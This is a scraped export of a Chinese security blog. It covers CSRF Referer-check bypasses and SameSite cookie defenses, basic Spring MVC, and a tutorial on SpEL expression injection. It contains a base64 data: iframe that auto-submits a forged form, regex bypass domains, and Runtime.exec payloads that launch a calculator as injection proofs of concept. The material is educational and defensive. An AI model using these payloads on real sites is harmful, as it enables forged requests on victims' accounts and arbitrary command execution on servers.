Referer字段的CSRF防御如果attack.com是一个可控的域名，bank.com是一个要攻击的域名。这个站点没有使用CSRF token但是检查了referer字段。你应该怎么做？ Referer字段为空利用ftp://,http://,https://,file://,javascript:,data:协议绕过。这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。 利用data:协议 12345&lt;html&gt; &lt;body&gt; &lt;iframe src=\"data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==\"&gt; &lt;/body&gt; &lt;/html&gt; Base64解码即可看到代码。 利用https协议 https向http跳转的时候Referer为空，拿一个https的webshell 1&lt;iframe src=\"https://xxxxx.xxxxx/attack.php\"&gt; attack.php写上CSRF攻击代码 移除Referer字段和发送一个空token值相同，有时候你只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面。 1&lt;meta name =“referrer”content =“no-referrer”&gt; 应用程序可能只是在发送后才会验证，这种情况下你可以绕过其CSRF防御。 绕过正则表达式如果referer检查是基于白名单的，你可以尝试绕过验证URL的正则表达式。例如，你可以尝试在referer的URL中将受害者域名置于二级域名区域或者URL目录区域。 如果一个站点在referer字段检查“bank.com”字段，那么“bank.com.attacker.com”或”attakcer.com/bank.com”可能可以绕过这种检测。 判断Referer是某域情况下绕过 比如你找的csrf是xxx.com验证的referer是验证的*.xx.com可以找个二级域名之后&lt;img &quot;csrf地址&quot;&gt;之后在把文章地址发出去就可以伪造。 0x09 Cookie的SameSite属性众所周知，正是cookie的滥用，才导致了CSRF漏洞的存在。 在Cookie出现SameSite属性之前，针对CSRF攻击的防御措施都是基于Anti-CSRF Token机制或者校验Referer头字段。 从Chrome 51开始，浏览器的Cookie新增加了一个SameSite属性，用来防止CSRF攻击和用户追踪（当然也能防御XSSI）。 其中可以设置如下三个属性值： Strict Lax None Strict Strict最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。 1Set-Cookie: CookieName=CookieValue; SameSite=Strict; 这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。 Lax Lax规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。 1Set-Cookie: CookieName=CookieValue; SameSite=Lax; 导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。 请求类型 示例 正常情况 Lax 链接 &lt;a href=&quot;...&quot;&gt;&lt;/a&gt; 发送 Cookie 发送 Cookie 预加载 &lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt; 发送 Cookie 发送 Cookie GET 表单 &lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt; 发送 Cookie 发送 Cookie POST 表单 &lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt; 发送 Cookie 不发送 iframe &lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt; 发送 Cookie 不发送 AJAX $.get(&quot;...&quot;) 发送 Cookie 不发送 Image &lt;img src=&quot;...&quot;&gt; 发送 Cookie 不发送 设置了Strict或Lax以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。 None Chrome 计划将Lax变为默认设置。这时，网站可以选择显式关闭SameSite属性，将其设为None。不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效。 下面的设置无效。 1Set-Cookie: widget_session=abc123; SameSite=None 下面的设置有效。 1Set-Cookie: widget_session=abc123; SameSite=None; Secure 安全整改一般而言，对于业务来说是建议设置SameSite属性值为Lax的，因为Strict太影响用户体验。 Lax对GET请求是放行的，因此整改的重点在于要严格区分GET和POST的职责，即GET只能进行一些查询类或导航类的访问、而不是进行状态更改，要执行一些更改类的表单操作就必须交由POST来处理，在这种场景下Lax的设置才会将风险降到较低。这是因为： 如果用GET携带参数访问，其中的参数值将会记录在浏览器历史、Web日志以及访问其他页面的Referer头字段中； Cookie的SameSite属性设置为Lax的GET请求还是会被攻击者利用进行CSRF攻击，且GET型CSRF攻击难度低； 当然，结合其他的Cookie头字段设置可以达到更高的安全性，可参考：https://scotthelme.co.uk/tough-cookies/","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"CSRF","slug":"CSRF","permalink":"https://www.mi1k7ea.com/tags/CSRF/"}]},{"title":"Spring MVC笔记","date":"2020-01-16T14:43:00.000Z","path":"2020/01/16/Spring-MVC笔记/","text":"0x00 参考http://c.biancheng.net/spring_mvc/ 0x01 MVC设计模式MVC是Model、View和Controller的缩写，分别代表Web应用程序中的三种职责： Model模型：用于存储数据以及处理用户请求的业务逻辑。 View视图：向控制器提交数据，显示模型中的数据。 Controller控制器：根据视图提出的请求判断将请求和数据交给哪个模型处理，将处理后的有关结果交给哪个视图更新显示。 MVC设计不仅限于Java Web应用，还包括许多应用，比如前端、PHP、.NET 等语言。之所以那么做的根本原因在于解耦各个模块。 其中，经典的基于Servlet的MVC模式的具体实现如下： 模型：一个或多个JavaBean对象，用于存储数据（实体模型，由JavaBean类创建）和处理业务逻辑（业务模型，由一般的Java类创建）。 视图：一个或多个JSP页面，向控制器提交数据和为模型提供数据显示，JSP页面主要使用HTML标记和JavaBean标记来显示数据。 控制器：一个或多个Servlet对象，根据视图提交的请求进行控制，即将请求转发给处理业务逻辑的JavaBean，并将处理结果存放到实体模型JavaBean中，输出给视图显示。 0x02 Spring MVC简介Spring MVC是Spring提供给Web应用的框架设计，是典型的MVC架构。 Spring MVC框架主要由DispatcherServlet、处理器映射、控制器、视图解析器、视图组成，其工作原理如图： …","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"SpEL表达式注入漏洞总结","date":"2020-01-10T14:05:19.000Z","path":"2020/01/10/SpEL表达式注入漏洞总结/","text":"0x01 SpEL表达式基础SpEL简介 在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。 在Spring系列产品中，SpEL是表达式计算的基础，实现了与Spring生态系统所有产品无缝对接。Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEL可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量Java代码。 SpEL有许多特性： 使用Bean的ID来引用Bean 可调用方法和访问对象的属性 可对值进行算数、关系和逻辑运算 可使用正则表达式进行匹配 可进行集合操作 SpEL定界符——#{}SpEL使用#{}作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。 这里需要注意#{}和${}的区别： #{}就是SpEL的定界符，用于指明内容未SpEL表达式并执行； ${}主要用于加载外部属性文件中的值； 两者可以混合使用，但是必须#{}在外面，${}在里面，如#{&#39;${}&#39;}，注意单引号是字符串类型才添加的； SpEL表达式类型字面值最简单的SpEL表达式就是仅包含一个字面值。 下面我们在XML配置文件中使用SpEL设置类属性的值为字面值，此时需要用到#{}定界符，注意若是指定为字符串的话需要添加单引号括起来： 12&lt;property name=\"message1\" value=\"#&#123;666&#125;\"/&gt;&lt;property name=\"message2\" value=\"#&#123;'mi1k7ea'&#125;\"/&gt; 还可以直接与字符串混用： 1&lt;property name=&quot;message&quot; value=&quot;the value is #&#123;666&#125;&quot;/&gt; Java基本数据类型都可以出现在SpEL表达式中，表达式中的数字也可以使用科学计数法： 1&lt;property name=\"salary\" value=\"#&#123;1e4&#125;\"/&gt; Demo直接用Spring的HelloWorld例子。 HelloWorld.java： 12345678910111213package com.mi1k7ea;public class HelloWorld &#123; private String message; public void setMessage(String message)&#123; this.message = message; &#125; public void getMessage()&#123; System.out.println(\"Your Message : \" + message); &#125;&#125; MainApp.java： 12345678910111213package com.mi1k7ea;import com.mi1k7ea.service.AccountService;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); HelloWorld obj = (HelloWorld) context.getBean(\"helloWorld\"); obj.getMessage(); &#125;&#125; Beans.xml： 1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \"&gt; &lt;bean id=\"helloWorld\" class=\"com.mi1k7ea.HelloWorld\"&gt; &lt;property name=\"message\" value=\"#&#123;'mi1k7ea'&#125; is #&#123;666&#125;\" /&gt; &lt;/bean&gt;&lt;/beans&gt; 运行输出： 1Your Message : mi1k7ea is 666 引用Bean、属性和方法引用BeanSpEL表达式能够通过其他Bean的ID进行引用，直接在#{}符号中写入ID名即可，无需添加单引号括起来。如： 123&lt;!--原来的写法，通过构造函数实现依赖注入--&gt;&lt;!--&lt;constructor-arg ref=\"test\"/&gt;--&gt;&lt;constructor-arg value=\"#&#123;test&#125;\"/&gt; 引用类属性 SpEL表达式能够访问类的属性。 比如，carl参赛者是一位模仿高手，kenny唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器： 12345678&gt;&lt;bean id=\"kenny\" class=\"com.spring.entity.Instrumentalist\"&gt; p:song=\"May Rain\"&gt; p:instrument-ref=\"piano\"/&gt;&gt;&lt;bean id=\"carl\" class=\"com.spring.entity.Instrumentalist\"&gt;&gt; &lt;property name=\"instrument\" value=\"#&#123;kenny.instrument&#125;\"/&gt;&gt; &lt;property name=\"song\" value=\"#&#123;kenny.song&#125;\"/&gt;&gt;&lt;/bean&gt;&gt; key指定kenny&lt;bean&gt; 的id，value指定kenny&lt;bean&gt;的song属性。其等价于执行下面的代码： 123&gt;Instrumentalist carl = new Instrumentalist();&gt;carl.setSong(kenny.getSong());&gt; 引用类方法 SpEL表达式还可以访问类的方法。 假设现在有个SongSelector类，该类有个selectSong()方法，这样的话carl就可以不用模仿别人，开始唱songSelector所选的歌了： 12&gt; &lt;property name=\"song\" value=\"#&#123;SongSelector.selectSong()&#125;\"/&gt;&gt; carl有个癖好，歌曲名不是大写的他就浑身难受，我们现在要做的就是仅仅对返回的歌曲调用toUpperCase()方法： 12&gt; &lt;property name=\"song\" value=\"#&#123;SongSelector.selectSong().toUpperCase()&#125;\"/&gt;&gt; 注意：这里我们不能确保不抛出NullPointerException，为了避免这个讨厌的问题，我们可以使用SpEL的null-safe存取器 12&gt; &lt;property name=\"song\" value=\"#&#123;SongSelector.selectSong()?.toUpperCase()&#125;\"/&gt;&gt; ?.符号会确保左边的表达式不会为null，如果为null的话就不会调用toUpperCase()方法了。 Demo——引用Bean这里我们修改基于构造函数的依赖注入的示例。 SpellChecker.java： 12345678910package com.mi1k7ea;public class SpellChecker &#123; public SpellChecker()&#123; System.out.println(\"Inside SpellChecker constructor.\" ); &#125; public void checkSpelling() &#123; System.out.println(\"Inside checkSpelling.\" ); &#125;&#125; TextEditor.java： 123456789101112package com.mi1k7ea;public class TextEditor &#123; private SpellChecker spellChecker; public TextEditor(SpellChecker spellChecker) &#123; System.out.println(\"Inside TextEditor constructor.\" ); this.spellChecker = spellChecker; &#125; public void spellCheck() &#123; spellChecker.checkSpelling(); &#125;&#125; MainApp.java： 123456789101112package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); TextEditor te = (TextEditor) context.getBean(\"textEditor\"); te.spellCheck(); &#125;&#125; Beans.xml，通过value=&quot;#{bean id}&quot;的方式替换掉之前的ref属性设置： 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \"&gt; &lt;!-- Definition for textEditor bean --&gt; &lt;bean id=\"textEditor\" class=\"com.mi1k7ea.TextEditor\"&gt; &lt;!--&lt;constructor-arg ref=\"spellChecker\"/&gt;--&gt; &lt;constructor-arg value=\"#&#123;spellChecker&#125;\"/&gt; &lt;/bean&gt; &lt;!-- Definition for spellChecker bean --&gt; &lt;bean id=\"spellChecker\" class=\"com.mi1k7ea.SpellChecker\" /&gt;&lt;/beans&gt; 运行输出： 123Inside SpellChecker constructor.Inside TextEditor constructor.Inside checkSpelling. 类类型表达式T(Type)在SpEL表达式中，使用T(Type)运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。 使用T(Type)来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。 在XML配置文件中的使用示例，要调用java.lang.Math来获取0~1的随机数： 1&lt;property name=\"random\" value=\"#&#123;T(java.lang.Math).random()&#125;\"/&gt; Expression中使用示例： 1234567891011121314ExpressionParser parser = new SpelExpressionParser();// java.lang 包类访问Class&lt;String&gt; result1 = parser.parseExpression(\"T(String)\").getValue(Class.class);System.out.println(result1);//其他包类访问String expression2 = \"T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')\";Class&lt;Object&gt; result2 = parser.parseExpression(expression2).getValue(Class.class);System.out.println(result2);//类静态字段访问int result3 = parser.parseExpression(\"T(Integer).MAX_VALUE\").getValue(int.class);System.out.println(result3);//类静态方法调用int result4 = parser.parseExpression(\"T(Integer).parseInt('1')\").getValue(int.class);System.out.println(result4); Demo在前面字面值的Demo中修改Beans.xml即可： 1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \"&gt; &lt;bean id=\"helloWorld\" class=\"com.mi1k7ea.HelloWorld\"&gt; &lt;property name=\"message\" value=\"#&#123;T(java.lang.Math).random()&#125;\" /&gt; &lt;/bean&gt;&lt;/beans&gt; 运行输出随机值： 1Your Message : 0.7593490190723996 恶意利用——弹计算器修改value中类类型表达式的类为Runtime并调用其命令执行方法即可： 1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \"&gt; &lt;bean id=\"helloWorld\" class=\"com.mi1k7ea.HelloWorld\"&gt; &lt;property name=\"message\" value=\"#&#123;T(java.lang.Runtime).getRuntime().exec('calc')&#125;\" /&gt; &lt;/bean&gt;&lt;/beans&gt; 运行即可弹计算器。 SpEL用法SpEL的用法有三种形式，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。 前面的就是以XML配置为例对SpEL表达式的用法进行的说明，而注解@Value的用法例子如下： 1234567public class EmailSender &#123; @Value(\"$&#123;spring.mail.username&#125;\") private String mailUsername; @Value(\"#&#123; systemProperties['user.region'] &#125;\") private String defaultLocale; //...&#125; 下面具体看下Expression的。 Expression用法由于后续分析的各种Spring CVE漏洞都是基于Expression形式的SpEL表达式注入，因此这里再单独说明SpEL表达式Expression这种形式的用法。 步骤 SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。 12345ExpressionParser parser = new SpelExpressionParser();Expression expression = parser.parseExpression(\"('Hello' + ' Mi1k7ea').concat(#end)\");EvaluationContext context = new StandardEvaluationContext();context.setVariable(\"end\", \"!\");System.out.println(expression.getValue(context)); 具体步骤如下： 创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现； 解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象； 构造上下文：准备比如变量定义等等表达式需要的上下文数据； 求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值； 主要接口 ExpressionParser 接口：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符； EvaluationContext 接口：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。 Expression 接口：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。 Demo应用示例如下，和前面XML配置的用法区别在于程序会将这里传入parseExpression()函数的字符串参数当初SpEL表达式来解析，而无需通过#{}符号来注明： 12345678910// 字符串字面量//String spel = \"123+456\";// 算数运算//String spel = \"123+456\";// 操作类弹计算器，当然java.lang包下的类是可以省略包名的String spel = \"T(java.lang.Runtime).getRuntime().exec(\\\"calc\\\")\";// String spel = \"T(java.lang.Runtime).getRuntime().exec(\\\"calc\\\")\";ExpressionParser parser = new SpelExpressionParser();Expression expression = parser.parseExpression(spel);System.out.println(expression.getValue()); 类实例化类实例化同样使用Java关键字new，类名必须是全限定名，但java.lang包内的类型除外。 1234String spel = \"new java.util.Date()\";ExpressionParser parser = new SpelExpressionParser();Expression expression = parser.parseExpression(spel);System.out.println(expression.getValue()); SpEL表达式运算下面内容引用自SpEL表达式。 SpEL提供了以下几种运算符： 运算符类型 运算符 算数运算 +, -, *, /, %, ^ 关系运算 &lt;, &gt;, ==, &lt;=, &gt;=, lt, gt, eq, le, ge 逻辑运算 and, or, not, ! 条件运算 ?:(ternary), ?:(Elvis) 正则表达式 matches 算数运算加法运算： 1&lt;property name=\"add\" value=\"#&#123;counter.total+42&#125;\"/&gt; 加号还可以用于字符串拼接： 1&lt;property name=\"blogName\" value=\"#&#123;my blog name is+' '+mrBird &#125;\"/&gt; ^运算符执行幂运算，其余算数运算符和Java一毛一样，这里不再赘述。 关系运算判断一个Bean的某个属性是否等于100： 1&lt;property name=\"eq\" value=\"#&#123;counter.total==100&#125;\"/&gt; 返回值是boolean类型。关系运算符唯一需要注意的是：在Spring XML配置文件中直接写&gt;=和&lt;=会报错。因为这”&lt;”和”&gt;”两个符号在XML中有特殊的含义。所以实际使用时，最号使用文本类型代替符号： 运算符 符号 文本类型 等于 == eq 小于 &lt; lt 小于等于 &lt;= le 大于 &gt; gt 大于等于 &gt;= ge 如： 1&lt;property name=\"eq\" value=\"#&#123;counter.total le 100&#125;\"/&gt; 逻辑运算SpEL表达式提供了多种逻辑运算符，其含义和Java也是一毛一样，只不过符号不一样罢了。 使用and运算符： 1&lt;property name=\"largeCircle\" value=\"#&#123;shape.kind == 'circle' and shape.perimeter gt 10000&#125;\"/&gt; 两边为true时才返回true。 其余操作一样，只不过非运算有not和!两种符号可供选择。非运算： 1&lt;property name=\"outOfStack\" value=\"#&#123;!product.available&#125;\"/&gt; 条件运算条件运算符类似于Java的三目运算符： 1&lt;property name=\"instrument\" value=\"#&#123;songSelector.selectSong() == 'May Rain' ? piano:saxphone&#125;\"/&gt; 当选择的歌曲为”May Rain”的时候，一个id为piano的Bean将装配到instrument属性中，否则一个id为saxophone的Bean将装配到instrument属性中。注意区别piano和字符串“piano”！ 一个常见的三目运算符的使用场合是判断是否为null值： 1&lt;property name=\"song\" value=\"#&#123;kenny.song !=null ? kenny.song:'Jingle Bells'&#125;\"/&gt; 这里，kenny.song引用重复了两次，SpEL提供了三目运算符的变体来简化表达式： 1&lt;property name=\"song\" value=\"#&#123;kenny.song !=null ?:'Jingle Bells'&#125;\"/&gt; 在以上示例中，如果kenny.song不为null，那么表达式的求值结果是kenny.song否则就是“Jingle Bells”。 正则表达式验证邮箱： 1&lt;property name=\"email\" value=\"#&#123;admin.email matches '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.com'&#125;\"/&gt; 虽然这个邮箱正则不够健壮，但对于演示matches来说足够啦。 集合操作SpEL表达式支持对集合进行操作。 下面我们以示例看下能进行哪些集合操作。 我们先创建一个City类： 12345678910111213141516171819202122232425package com.mi1k7ea;public class City &#123; private String name; private String state; private int population; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getState() &#123; return state; &#125; public void setState(String state) &#123; this.state = state; &#125; public int getPopulation() &#123; return population; &#125; public void setPopulation(int population) &#123; this.population = population; &#125;&#125; 修改Beans.xml，使用&lt;util:list&gt;元素配置一个包含City对象的List集合： 123456789101112131415161718192021222324252627282930&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p=\"http://www.springframework.org/schema/p\" xmlns:util=\"http://www.springframework.org/schema/util\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util-4.0.xsd\"&gt; &lt;util:list id=\"cities\"&gt; &lt;bean class=\"com.mi1k7ea.City\" p:name=\"Chicago\" p:state=\"IL\" p:population=\"2853114\"/&gt; &lt;bean class=\"com.mi1k7ea.City\" p:name=\"Atlanta\" p:state=\"GA\" p:population=\"537958\"/&gt; &lt;bean class=\"com.mi1k7ea.City\" p:name=\"Dallas\" p:state=\"TX\" p:population=\"1279910\"/&gt; &lt;bean class=\"com.mi1k7ea.City\" p:name=\"Houston\" p:state=\"TX\" p:population=\"2242193\"/&gt; &lt;bean class=\"com.mi1k7ea.City\" p:name=\"Odessa\" p:state=\"TX\" p:population=\"90943\"/&gt; &lt;bean class=\"com.mi1k7ea.City\" p:name=\"El Paso\" p:state=\"TX\" p:population=\"613190\"/&gt; &lt;bean class=\"com.mi1k7ea.City\" p:name=\"Jal\" p:state=\"NM\" p:population=\"1996\"/&gt; &lt;bean class=\"com.mi1k7ea.City\" p:name=\"Las Cruces\" p:state=\"NM\" p:population=\"91865\"/&gt; &lt;/util:list&gt;&lt;/beans&gt; 访问集合成员SpEL表达式支持通过#{集合ID[i]}的方式来访问集合中的成员。 定义一个ChoseCity类： 1234567891011package com.mi1k7ea;public class ChoseCity &#123; private City city; public void setCity(City city) &#123; this.city = city; &#125; public City getCity() &#123; return city; &#125;&#125; 在Beans.xml中，选取集合中的某一个成员，并赋值给city属性中： 123&lt;bean id=\"choseCity\" class=\"com.mi1k7ea.ChoseCity\"&gt; &lt;property name=\"city\" value=\"#&#123;cities[0]&#125;\"/&gt;&lt;/bean&gt; MainApp.java，实例化这个Bean： 123456789101112package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); ChoseCity c = (ChoseCity)context.getBean(\"choseCity\"); System.out.println(c.getCity().getName()); &#125;&#125; 运行无误则输出”Chicago”。 随机地选择一个city，中括号[]运算符始终通过索引访问集合中的成员： 1&lt;property name=\"city\" value=\"#&#123;cities[T(java.lang.Math).random()*cities.size()]&#125;\"/&gt; 此时会随机访问一个集合成员并输出。 []运算符同样可以用来获取java.util.Map集合中的成员。例如，假设City对象以其名字作为键放入Map集合中，在这种情况下，我们可以像下面那样获取键为Dallas的entry： 12&gt; &lt;property name=\"chosenCity\" value=\"#&#123;cities['Dallas']&#125;\"/&gt;&gt; []运算符的另一种用法是从java.util.Properties集合中取值。例如，假设我们需要通过&lt;util:properties&gt;元素在Spring中加载一个properties配置文件： 12&gt; &lt;util:properties id=\"settings\" loaction=\"classpath:settings.properties\"/&gt;&gt; 现在要在这个配置文件Bean中访问一个名为twitter.accessToken的属性： 12&gt; &lt;property name=\"accessToken\" value=\"#&#123;settings['twitter.accessToken']&#125;\"/&gt;&gt; []运算符同样可以通过索引来得到某个字符串的某个字符，例如下面的表达式将返回s： 12&gt; &apos;This is a test&apos;[3]&gt; 查询集合成员SpEL表达式中提供了查询运算符来实现查询符合条件的集合成员： .?[]：返回所有符合条件的集合成员； .^[]：从集合查询中查出第一个符合条件的集合成员； .$[]：从集合查询中查出最后一个符合条件的集合成员； 修改ChoseCity类，将city属性类型改为City列表类型： 1234567891011121314package com.mi1k7ea;import java.util.List;public class ChoseCity &#123; private List&lt;City&gt; city; public List&lt;City&gt; getCity() &#123; return city; &#125; public void setCity(List&lt;City&gt; city) &#123; this.city = city; &#125;&#125; 修改Beans.xml： 123&lt;bean id=\"choseCity\" class=\"com.mi1k7ea.ChoseCity\"&gt; &lt;property name=\"city\" value=\"#&#123;cities.?[population gt 100000]&#125;\"/&gt;&lt;/bean&gt; 修改MainApp.java： 1234567891011121314package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); ChoseCity c = (ChoseCity)context.getBean(\"choseCity\"); for(City city:c.getCity())&#123; System.out.println(city.getName()); &#125; &#125;&#125; 运行输出： 12345ChicagoAtlantaDallasHoustonEl Paso 集合投影 集合投影就是从集合的每一个成员中选择特定的属性放入到一个新的集合中。SpEL的投影运算符.![]完全可以做到这一点。 例如，我们仅需要包含城市名称的一个String类型的集合： 12&gt; &lt;property name=\"cityNames\" value=\"#&#123;cities.![name]&#125;\"/&gt;&gt; 再比如，得到城市名字加州名的集合： 12&gt; &lt;property name=&quot;cityNames&quot; value=&quot;#&#123;cities.![name+&apos;,&apos;+state]&#125;&quot;/&gt;&gt; 把符合条件的城市的名字和州名作为一个新的集合： 12&gt; &lt;property name=\"cityNames\" value=\"#&#123;cities.?[population gt 100000].![name+','+state]&#125;\"/&gt;&gt; 变量定义和引用在SpEL表达式中，变量定义通过EvaluationContext类的setVariable(variableName, value)函数来实现；在表达式中使用”#variableName”来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象： #this：使用当前正在计算的上下文； #root：引用容器的root对象； 示例，使用setVariable()函数定义了名为variable的变量，并且通过#variable来引用，同时尝试引用根对象和上下文对象： 123456789ExpressionParser parser = new SpelExpressionParser();EvaluationContext context = new StandardEvaluationContext(\"mi1k7ea\");context.setVariable(\"variable\", \"666\");String result1 = parser.parseExpression(\"#variable\").getValue(context, String.class);System.out.println(result1);String result2 = parser.parseExpression(\"#root\").getValue(context, String.class);System.out.println(result2);String result3 = parser.parseExpression(\"#this\").getValue(context, String.class);System.out.println(result3); 输出： 123666mi1k7eami1k7ea instanceof 表达式SpEL 支持 instanceof 运算符，跟 Java 内使用同义；如”‘haha’ instanceof T(String)”将返回 true。 自定义函数目前只支持类静态方法注册为自定义函数。SpEL使用StandardEvaluationContext的registerFunction方法进行注册自定义函数，其实完全可以使用setVariable代替，两者其实本质是一样的。 示例，用户自定义实现字符串反转的函数： 1234567891011package com.mi1k7ea;public class UserFunc &#123; public static String reverseString(String input) &#123; StringBuilder backwards = new StringBuilder(); for (int i = 0; i &lt; input.length(); i++) &#123; backwards.append(input.charAt(input.length() - 1 - i)); &#125; return backwards.toString(); &#125;&#125; 通过如下代码将方法注册到StandardEvaluationContext并且来使用它： 12345ExpressionParser parser = new SpelExpressionParser();StandardEvaluationContext context = new StandardEvaluationContext();context.registerFunction(\"reverseString\", UserFunc.class.getDeclaredMethod(\"reverseString\", new Class[] &#123; String.class &#125;));String helloWorldReversed = parser.parseExpression(\"#reverseString('mi1k7ea')\").getValue(context, String.class);System.out.println(helloWorldReversed); 输出反转的字符串ae7k1im。 0x02 SpEL表达式注入漏洞漏洞原理SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext： SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。 StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。 SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。 由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。 如下，前面的例子中已提过： 1234567891011121314package com.mi1k7ea;import org.springframework.expression.Expression;import org.springframework.expression.ExpressionParser;import org.springframework.expression.spel.standard.SpelExpressionParser;public class MainApp &#123; public static void main(String[] args) throws Exception &#123; String spel = \"T(java.lang.Runtime).getRuntime().exec(\\\"calc\\\")\"; ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(spel); System.out.println(expression.getValue()); &#125;&#125; 